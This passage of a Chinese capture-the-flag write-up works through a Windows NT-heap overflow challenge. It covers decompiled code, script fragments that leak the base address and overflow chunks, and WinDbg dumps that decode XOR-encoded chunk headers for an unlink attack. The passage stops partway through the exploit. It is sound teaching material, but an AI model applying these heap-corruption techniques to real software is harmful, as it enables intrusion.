&#125;</span><br><span class="line">LABEL_46:</span><br><span class="line">    *(_DWORD *)choice = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nSo what do you want?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Make a sword&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Destroy a sword&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Polish a sword&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Check a sword&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. Weapon is equipped. I&#x27;m ready for new challenge!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your choice?&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="type">char</span>)choice) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传统的菜单堆，有五个选项：</p>
<ul>
<li><code>add</code> ： 最多 <code>18</code> 个，<code>size</code> 大小在 <code>0</code> 到 <code>0x100</code> 之间</li>
<li><code>free</code> ： 正常</li>
<li><code>show</code> ： 正常</li>
<li><code>edit</code> ：新输入一个 <code>size</code> ，可以溢出</li>
<li><code>hidden</code> ： 任意地址写一个 <code>1</code></li>
</ul>
<p>很直接的堆溢出，由于直接给了程序的基址，所以可以使用 <code>unlink</code> 攻击</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先使用泄露的地址算出 <code>exe_base</code> 和 <code>chunk_list</code> 的位置，然后 <code>add</code> 一个 新的块：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&quot;And here is your Novice village gift : 0x&quot;</span>)</span><br><span class="line">exe_base = <span class="built_in">int</span>(ru(<span class="string">&quot;\r\n&quot;</span>),<span class="number">16</span>) - <span class="number">0x1090</span></span><br><span class="line">success(<span class="string">&quot;exe_base&quot;</span>,exe_base)</span><br><span class="line"></span><br><span class="line">chunk_list = exe_base + <span class="number">0x4370</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>首先使用 <code>.process</code> 查看进程的 <code>PEB</code> 地址，随后使用 <code>td _PEB peb_addr</code> 查看进程的 <code>PEB</code> 信息，如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:003&gt; .process</span><br><span class="line">Implicit process <span class="keyword">is</span> now 00a5c000</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:003&gt;  dt _PEB 00a5c000</span><br><span class="line">ntdll!_PEB</span><br><span class="line">		[...]</span><br><span class="line">   +<span class="number">0x018</span> ProcessHeap      : <span class="number">0x00d00000</span> Void // 默认的线程堆空间起始地址</span><br><span class="line">   +<span class="number">0x01c</span> FastPebLock      : <span class="number">0x77525b40</span> _RTL_CRITICAL_SECTION</span><br><span class="line">		[...]</span><br><span class="line">   +<span class="number">0x07c</span> HeapSegmentCommit : <span class="number">0x2000</span> // 默认堆地址⼤⼩</span><br><span class="line">   +<span class="number">0x080</span> HeapDeCommitTotalFreeThreshold : <span class="number">0x10000</span> // 默认堆的初始提交⼤⼩</span><br><span class="line">   +<span class="number">0x084</span> HeapDeCommitFreeBlockThreshold : <span class="number">0x1000</span> // 与堆释放有关的阈值</span><br><span class="line">   +<span class="number">0x088</span> NumberOfHeaps    : <span class="number">2</span> // 程序中堆空间的数量</span><br><span class="line">   +<span class="number">0x08c</span> MaximumNumberOfHeaps : <span class="number">0x10</span> // 程序中最⼤的堆的数量</span><br><span class="line">   +<span class="number">0x090</span> ProcessHeaps     : <span class="number">0x77524840</span>  -&gt; <span class="number">0x00d00000</span> Void //存储所有</span><br><span class="line">堆空间的数组</span><br><span class="line">		[...]</span><br></pre></td></tr></table></figure>

<p>使用 <code>!heap</code> 查看创建的堆空间</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:003&gt; !heap -h</span><br><span class="line">Index   Address  Name      Debugging options enabled</span><br><span class="line">  <span class="number">1</span>:   00d00000 </span><br><span class="line">    Segment at 00d00000 to 00dff000 (0000b000 <span class="built_in">bytes</span> committed)</span><br><span class="line">  <span class="number">2</span>:   01320000 </span><br><span class="line">    Segment at 01320000 to 01322000 (00002000 <span class="built_in">bytes</span> committed)</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:003&gt; !heap</span><br><span class="line">        Heap Address      NT/Segment Heap</span><br><span class="line"></span><br><span class="line">              d00000              NT Heap</span><br><span class="line">             <span class="number">1320000</span>              NT Heap</span><br></pre></td></tr></table></figure>

<p>直接使用 <code>dt _HEAP heap_addr</code> 查看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:003&gt; dt _HEAP <span class="number">1320000</span></span><br><span class="line">ntdll!_HEAP</span><br><span class="line">   +<span class="number">0x000</span> Segment          : _HEAP_SEGMENT</span><br><span class="line">   +<span class="number">0x000</span> Entry            : _HEAP_ENTRY</span><br><span class="line">   +<span class="number">0x008</span> SegmentSignature : <span class="number">0xffeeffee</span></span><br><span class="line">   +<span class="number">0x00c</span> SegmentFlags     : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x010</span> SegmentListEntry : _LIST_ENTRY [ <span class="number">0x13200a4</span> - <span class="number">0x13200a4</span> ]</span><br><span class="line">   +<span class="number">0x018</span> Heap             : <span class="number">0x01320000</span> _HEAP</span><br><span class="line">   +<span class="number">0x01c</span> BaseAddress      : <span class="number">0x01320000</span> Void</span><br><span class="line">   +<span class="number">0x020</span> NumberOfPages    : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x024</span> FirstEntry       : <span class="number">0x01320490</span> _HEAP_ENTRY</span><br><span class="line">   +<span class="number">0x028</span> LastValidEntry   : <span class="number">0x01322000</span> _HEAP_ENTRY</span><br><span class="line">   +<span class="number">0x02c</span> NumberOfUnCommittedPages : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x030</span> NumberOfUnCommittedRanges : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x034</span> SegmentAllocatorBackTraceIndex : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x036</span> Reserved         : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x038</span> UCRSegmentList   : _LIST_ENTRY [ <span class="number">0x1321ff0</span> - <span class="number">0x1321ff0</span> ]</span><br><span class="line">   +<span class="number">0x040</span> Flags            : <span class="number">0x1001</span></span><br><span class="line">   +<span class="number">0x044</span> ForceFlags       : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x048</span> CompatibilityFlags : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x04c</span> EncodeFlagMask   : <span class="number">0x100000</span> // 初始化为<span class="number">0x100000</span>，⽤于判断是否要加密chunk_header</span><br><span class="line">   +<span class="number">0x050</span> Encoding         : _HEAP_ENTRY // ⽤于异或chunk_header的值</span><br><span class="line">   +<span class="number">0x058</span> Interceptor      : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x05c</span> VirtualMemoryThreshold : <span class="number">0xfe00</span></span><br><span class="line">   +<span class="number">0x060</span> Signature        : <span class="number">0xeeffeeff</span></span><br><span class="line">   +<span class="number">0x064</span> SegmentReserve   : <span class="number">0x100000</span></span><br><span class="line">   +<span class="number">0x068</span> SegmentCommit    : <span class="number">0x2000</span></span><br><span class="line">   +<span class="number">0x06c</span> DeCommitFreeBlockThreshold : <span class="number">0x200</span></span><br><span class="line">   +<span class="number">0x070</span> DeCommitTotalFreeThreshold : <span class="number">0x2000</span></span><br><span class="line">   +<span class="number">0x074</span> TotalFreeSize    : <span class="number">0x366</span></span><br><span class="line">   +<span class="number">0x078</span> MaximumAllocationSize : <span class="number">0x7ffdefff</span></span><br><span class="line">   +<span class="number">0x07c</span> ProcessHeapsListIndex : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x07e</span> HeaderValidateLength : <span class="number">0x258</span></span><br><span class="line">   +<span class="number">0x080</span> HeaderValidateCopy : (null) </span><br><span class="line">   +<span class="number">0x084</span> NextAvailableTagIndex : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x086</span> MaximumTagIndex  : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x088</span> TagEntries       : (null) </span><br><span class="line">   +<span class="number">0x08c</span> UCRList          : _LIST_ENTRY [ <span class="number">0x132008c</span> - <span class="number">0x132008c</span> ]</span><br><span class="line">   +<span class="number">0x094</span> AlignRound       : <span class="number">0xf</span></span><br><span class="line">   +<span class="number">0x098</span> AlignMask        : <span class="number">0xfffffff8</span></span><br><span class="line">   +<span class="number">0x09c</span> VirtualAllocdBlocks : _LIST_ENTRY [ <span class="number">0x132009c</span> - <span class="number">0x132009c</span> ]</span><br><span class="line">   +<span class="number">0x0a4</span> SegmentList      : _LIST_ENTRY [ <span class="number">0x1320010</span> - <span class="number">0x1320010</span> ]</span><br><span class="line">   +<span class="number">0x0ac</span> AllocatorBackTraceIndex : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0b0</span> NonDedicatedListLength : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0b4</span> BlocksIndex      : <span class="number">0x01320258</span> Void // 后端堆管理器结构体</span><br><span class="line">   +<span class="number">0x0b8</span> UCRIndex         : (null) </span><br><span class="line">   +<span class="number">0x0bc</span> PseudoTagEntries : (null) </span><br><span class="line">   +<span class="number">0x0c0</span> FreeLists        : _LIST_ENTRY [ <span class="number">0x13204b8</span> - <span class="number">0x13204b8</span> ] // 空闲的后端堆链表</span><br><span class="line">   +<span class="number">0x0c8</span> LockVariable     : (null) </span><br><span class="line">   +<span class="number">0x0cc</span> CommitRoutine    : <span class="number">0x2802ec61</span>     long  +2802ec61</span><br><span class="line">   +<span class="number">0x0d0</span> StackTraceInitVar : _RTL_RUN_ONCE</span><br><span class="line">   +<span class="number">0x0d4</span> CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">   +<span class="number">0x0e4</span> FrontEndHeap     : (null)  // 前端堆管理结构</span><br><span class="line">   +<span class="number">0x0e8</span> FrontHeapLockCount : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ea</span> FrontEndHeapType : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +<span class="number">0x0eb</span> RequestedFrontEndHeapType : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +<span class="number">0x0ec</span> FrontEndHeapUsageData : (null)  // 指向⼀个对应个前端堆⼤⼩的chunk阵列</span><br><span class="line">   +<span class="number">0x0f0</span> FrontEndHeapMaximumIndex : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0f2</span> FrontEndHeapStatusBitmap : [<span class="number">257</span>]  <span class="string">&quot;&quot;</span></span><br><span class="line">   +<span class="number">0x1f4</span> Counters         : _HEAP_COUNTERS</span><br><span class="line">   +<span class="number">0x250</span> TuningParameters : _HEAP_TUNING_PARAMETERS</span><br></pre></td></tr></table></figure>

<p>查看 <code>Encoding</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:003&gt; dx -r1 (*((ntdll!_HEAP_ENTRY *)(<span class="number">0x1320000</span>+<span class="number">0x50</span>)))</span><br><span class="line">(*((ntdll!_HEAP_ENTRY *)(<span class="number">0x1320000</span>+<span class="number">0x50</span>)))                 [<span class="type">Type</span>: _HEAP_ENTRY]</span><br><span class="line">    [+<span class="number">0x000</span>] UnpackedEntry    [<span class="type">Type</span>: _HEAP_UNPACKED_ENTRY]</span><br><span class="line">    [+<span class="number">0x000</span>] Size             : <span class="number">0x4e6c</span> [<span class="type">Type</span>: unsigned short]</span><br><span class="line">    [+<span class="number">0x002</span>] Flags            : <span class="number">0x3f</span> [<span class="type">Type</span>: unsigned char]</span><br><span class="line">    [+<span class="number">0x003</span>] SmallTagIndex    : <span class="number">0x7a</span> [<span class="type">Type</span>: unsigned char]</span><br><span class="line">    [+<span class="number">0x000</span>] SubSegmentCode   : <span class="number">0x7a3f4e6c</span> [<span class="type">Type</span>: unsigned long]</span><br><span class="line">    [+<span class="number">0x004</span>] PreviousSize     : <span class="number">0x4b54</span> [<span class="type">Type</span>: unsigned short]</span><br><span class="line">    [+<span class="number">0x006</span>] SegmentOffset    : <span class="number">0x0</span> [<span class="type">Type</span>: unsigned char]</span><br><span class="line">    [+<span class="number">0x006</span>] LFHFlags         : <span class="number">0x0</span> [<span class="type">Type</span>: unsigned char]</span><br><span class="line">    [+<span class="number">0x007</span>] UnusedBytes      : <span class="number">0x0</span> [<span class="type">Type</span>: unsigned char]</span><br><span class="line">    [+<span class="number">0x000</span>] ExtendedEntry    [<span class="type">Type</span>: _HEAP_EXTENDED_ENTRY]</span><br><span class="line">    [+<span class="number">0x000</span>] FunctionIndex    : <span class="number">0x4e6c</span> [<span class="type">Type</span>: unsigned short]</span><br><span class="line">    [+<span class="number">0x002</span>] ContextValue     : <span class="number">0x7a3f</span> [<span class="type">Type</span>: unsigned short]</span><br><span class="line">    [+<span class="number">0x000</span>] InterceptorValue : <span class="number">0x7a3f4e6c</span> [<span class="type">Type</span>: unsigned long]</span><br><span class="line">    [+<span class="number">0x004</span>] UnusedBytesLength : <span class="number">0x4b54</span> [<span class="type">Type</span>: unsigned short]</span><br><span class="line">    [+<span class="number">0x006</span>] EntryOffset      : <span class="number">0x0</span> [<span class="type">Type</span>: unsigned char]</span><br><span class="line">    [+<span class="number">0x007</span>] ExtendedBlockSignature : <span class="number">0x0</span> [<span class="type">Type</span>: unsigned char]</span><br><span class="line">    [+<span class="number">0x000</span>] Code1            : <span class="number">0x7a3f4e6c</span> [<span class="type">Type</span>: unsigned long]</span><br><span class="line">    [+<span class="number">0x004</span>] Code2            : <span class="number">0x4b54</span> [<span class="type">Type</span>: unsigned short]</span><br><span class="line">    [+<span class="number">0x006</span>] Code3            : <span class="number">0x0</span> [<span class="type">Type</span>: unsigned char]</span><br><span class="line">    [+<span class="number">0x007</span>] Code4            : <span class="number">0x0</span> [<span class="type">Type</span>: unsigned char]</span><br><span class="line">    [+<span class="number">0x004</span>] Code234          : <span class="number">0x4b54</span> [<span class="type">Type</span>: unsigned long]</span><br><span class="line">    [+<span class="number">0x000</span>] AgregateCode     : <span class="number">0x4b547a3f4e6c</span> [<span class="type">Type</span>: unsigned __int64]</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:003&gt; dq <span class="number">0x1320000</span>+<span class="number">0x50</span></span><br><span class="line">01320050  00004b54`7a3f4e6c 0000fe00`<span class="number">00000000</span></span><br><span class="line">01320060  <span class="number">00</span>100000`eeffeeff 00000200`00002000</span><br><span class="line">01320070  00000366`00002000 02580002`7ffdefff</span><br><span class="line">01320080  <span class="number">00000000</span>`<span class="number">00000000</span> 0132008c`<span class="number">00000000</span></span><br><span class="line">01320090  0000000f`0132008c 0132009c`fffffff8</span><br><span class="line">013200a0  01320010`0132009c <span class="number">00000000</span>`01320010</span><br><span class="line">013200b0  01320258`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">013200c0  013204b8`013204b8 2802ec61`<span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p><code>Encoding</code> 的值为 <code>0x00004b547a3f4e6c</code></p>
<p>找到我们所分配出来的两个堆块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:003&gt; dc babyheap + <span class="number">0x4370</span></span><br><span class="line">002d4370  01320498 013204a8 <span class="number">00000000</span> <span class="number">00000000</span>  .<span class="number">.2</span>..<span class="number">.2</span>.........</span><br><span class="line">002d4380  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d4390  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43b0  <span class="number">00000000</span> <span class="number">00000000</span> 01320000 <span class="number">00000</span>101  .........<span class="number">.2</span>.....</span><br><span class="line">002d43c0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43d0  00000002 <span class="number">00000000</span> 00000024 <span class="number">00000000</span>  ........$.......</span><br><span class="line">002d43e0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:003&gt; dq 01320498-<span class="number">0x8</span></span><br><span class="line">01320490  0f004bc6`793e4e6e 013200c0`01320030</span><br><span class="line">013204a0  0f004b56`793e4e6e 013200c0`01320031</span><br><span class="line">013204b0  00004b56`1f3f4d0a 013200c0`013200c0</span><br><span class="line">013204c0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">013204d0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">013204e0</span>  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">013204f0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">01320500  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:003&gt; ?0f004bc6`793e4e6e^00004b54`7a3f4e6c</span><br><span class="line">Evaluate expression: <span class="number">1080864537684541442</span> = 0f000092`03010002</span><br></pre></td></tr></table></figure>

<p>从右往左的第 <code>1-2</code> 个字节为 <code>0002</code> 代表 <code>size</code> 为 <code>0x20</code></p>
<p>第 <code>3</code> 个字节 <code>flag</code> 为 <code>01</code> 代表 <code>inused</code></p>
<p>第 <code>4</code> 个字节 <code>SmallTagIndex</code> 为 <code>0x3 = (0x2^0x0^0x1) = 0x3</code></p>
<p>第 <code>5</code> 个字节 <code>previous size</code> 为 <code>0x92</code></p>
<p>第 <code>8</code> 个字节 <code>Unsortedbyte</code> 为 <code>0xf</code></p>
<p>我们尝试分配更多的块，然后进行 <code>free</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>查看堆块，发现被 <code>free</code> 掉的堆块的 <code>flink</code> 和 <code>blink</code> 会更改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:004&gt; dc babyheap + <span class="number">0x4370</span></span><br><span class="line">002d4370  00b90498 00b904a8 00b904b8 00b904c8  ................</span><br><span class="line">002d4380  00b904d8 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d4390  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43b0  <span class="number">00000000</span> <span class="number">00000000</span> 00b90000 <span class="number">000</span>10001  ................</span><br><span class="line">002d43c0  00000001 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43d0  00000002 <span class="number">00000000</span> 00000024 <span class="number">00000000</span>  ........$.......</span><br><span class="line">002d43e0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:004&gt; dc 00b90498-<span class="number">8</span></span><br><span class="line">00b90490  9cf39174 0f004894 00b90030 00b900c0  t....H.<span class="number">.0</span>.......</span><br><span class="line">00b904a0  9df29174 00004804 00b904c8 00b900c0  t....H..........</span><br><span class="line">00b904b0  9cf39174 0f004804 00b90032 00b900c0  t....H.<span class="number">.2</span>.......</span><br><span class="line">00b904c0  9df29174 00004804 00b904e8 00b904a8  t....H..........</span><br><span class="line">00b904d0  9cf39174 0f004804 00b90034 00b900c0  t....H.<span class="number">.4</span>.......</span><br><span class="line">00b904e0  fcf29216 00004804 00b900c0 00b904c8  .....H..........</span><br><span class="line">00b904f0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">00b90500  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br></pre></td></tr></table></figure>

<p>之后尝试构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&quot;a&quot;</span> * <span class="number">8</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>发现 <code>show</code> 的时候可以把后面 <code>chunk</code> 的 <code>header</code> 给打印出来一点点</p>
<p><img src="https://s2.loli.net/2022/05/04/UsMgyh9mTS5lnNw.png" alt="Untitled.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:004&gt; dc babyheap + <span class="number">0x4370</span></span><br><span class="line">002d4370  01310498 013104a8 013104b8 <span class="number">00000000</span>  .<span class="number">.1</span>..<span class="number">.1</span>..<span class="number">.1</span>.....</span><br><span class="line">002d4380  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d4390  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43b0  <span class="number">00000000</span> <span class="number">00000000</span> 01310000 <span class="number">000</span>10101  .........<span class="number">.1</span>.....</span><br><span class="line">002d43c0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43d0  00000002 <span class="number">00000000</span> 00000024 <span class="number">00000000</span>  ........$.......</span><br><span class="line">002d43e0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line"><span class="number">0</span>:004&gt; dc 013104a8-<span class="number">0x8</span></span><br><span class="line">013104a0  009c5549 0f006f9e <span class="number">61616161</span> <span class="number">61616161</span>  IU...o..aaaaaaaa</span><br><span class="line">013104b0  009c5549 0f006f9e 01310032 013100c0  IU...o.<span class="number">.2</span><span class="number">.1</span>..<span class="number">.1</span>.</span><br><span class="line">013104c0  649d562f 00006f9e 013100c0 013100c0  /V.d.o...<span class="number">.1</span>..<span class="number">.1</span>.</span><br><span class="line">013104d0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line"><span class="number">013104e0</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">013104f0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">01310500  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">01310510  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br></pre></td></tr></table></figure>

<p>由于有 <code>00</code> 截断，所以并不能够得到完整的 <code>header</code> ，不过没关系，我们可以通过一个字节一个字节的泄露来得到完整的 <code>header</code></p>
